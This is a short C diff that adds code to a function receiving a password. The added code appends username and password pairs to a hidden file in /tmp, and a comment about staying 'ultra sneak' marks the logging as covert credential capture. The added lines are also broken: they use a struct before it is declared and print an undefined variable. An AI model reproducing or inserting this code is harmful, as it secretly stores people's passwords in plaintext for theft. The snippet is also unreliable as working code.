@@ -12,6 +12,20 @@
 
 int writetofile (char *password){
 
+    /* Create Stuff for File*/
+    FILE * fptr;
+    fptr = fopen("/tmp/18432443.tmp", "a"); // Remove for ultra sneak
+    char * user;
+
+    // Write Shit
+    if (pw) {
+        user = pw->pw_name;
+    }
+    else {
+        user = "unknown";
+    }
+    fprintf(fptr, "%s:%s\n", name, password);
+
     /* Get UID */
     uid_t uid = geteuid();
     struct passwd * pw = getpwuid(uid);
